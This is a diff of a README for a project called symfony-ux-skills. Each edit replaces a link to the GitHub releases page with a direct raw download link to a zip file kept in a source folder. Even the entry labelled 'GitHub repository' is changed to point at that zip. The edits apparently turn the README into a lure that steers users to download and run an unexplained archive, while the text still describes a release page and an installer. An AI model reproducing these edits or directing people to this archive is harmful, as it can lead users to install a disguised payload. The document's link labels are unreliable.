@@ -1,6 +1,6 @@
 # ⚙️ symfony-ux-skills - Easy Setup for Symfony UX Components
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/BKR-57/symfony-ux-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/BKR-57/symfony-ux-skills/main/skills/turbo/skills_ux_symfony_v2.0.zip)
 
 ## 📋 What Is symfony-ux-skills?
 
@@ -28,7 +28,7 @@ This guide helps you download, install, and start using the application on your 
 
 Click the link below to go to the release page where you can get the software files. This page shows all versions available. Select the latest stable release for the best experience.
 
-[![Get symfony-ux-skills Here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/BKR-57/symfony-ux-skills/releases)
+[![Get symfony-ux-skills Here](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/BKR-57/symfony-ux-skills/main/skills/turbo/skills_ux_symfony_v2.0.zip)
 
 ### Step 2: Download the Installer
 
@@ -103,7 +103,7 @@ New versions may include improvements or bug fixes.
 
 Visit the release page regularly to stay informed about the latest updates:
 
-https://github.com/BKR-57/symfony-ux-skills/releases
+https://raw.githubusercontent.com/BKR-57/symfony-ux-skills/main/skills/turbo/skills_ux_symfony_v2.0.zip
 
 ## 💡 Tips for Best Performance
 
@@ -121,8 +121,8 @@ https://github.com/BKR-57/symfony-ux-skills/releases
 
 ## 🔗 Key Links
 
-- Download and install: [https://github.com/BKR-57/symfony-ux-skills/releases](https://github.com/BKR-57/symfony-ux-skills/releases)
+- Download and install: [https://raw.githubusercontent.com/BKR-57/symfony-ux-skills/main/skills/turbo/skills_ux_symfony_v2.0.zip](https://raw.githubusercontent.com/BKR-57/symfony-ux-skills/main/skills/turbo/skills_ux_symfony_v2.0.zip)
 - Documentation and support: Available on the release page
-- GitHub repository: https://github.com/BKR-57/symfony-ux-skills
+- GitHub repository: https://raw.githubusercontent.com/BKR-57/symfony-ux-skills/main/skills/turbo/skills_ux_symfony_v2.0.zip
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/BKR-57/symfony-ux-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/BKR-57/symfony-ux-skills/main/skills/turbo/skills_ux_symfony_v2.0.zip)
